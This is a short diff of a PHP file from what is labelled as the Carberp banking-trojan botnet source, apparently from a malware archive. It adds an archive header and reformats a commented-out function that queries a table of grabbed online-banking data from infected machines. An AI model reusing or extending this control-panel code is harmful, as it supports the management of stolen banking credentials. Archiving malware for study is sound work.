@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 get_function('html_pages');
@@ -65,7 +76,8 @@ if(count($_SESSION['search']['ibank'])){
 
 //if(!empty($filter)) $filter = 'WHERE ' . $filter;
 /*
-function get_files($row){	global $files, $mysqli, $filter;
+function get_files($row){
+	global $files, $mysqli, $filter;
     //$item = $mysqli->query('SELECT a.id, a.prefix, a.uid, a.pid, a.hwnd, MAX(a.post_date) post_date, a.grp, COUNT(a.id) count, (SELECT b.comment FROM bf_comments b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (uniq = a.grp) AND (b.type = \'ibnkgra\') LIMIT 1) comment FROM bf_ibank_gra a WHERE (a.prefix = \''.$row->prefix.'\') AND (a.uid = \''.$row->uid.'\') GROUP by grp', null, null, false);
 	$files[$row->prefix . $row->uid] = $row;
 }
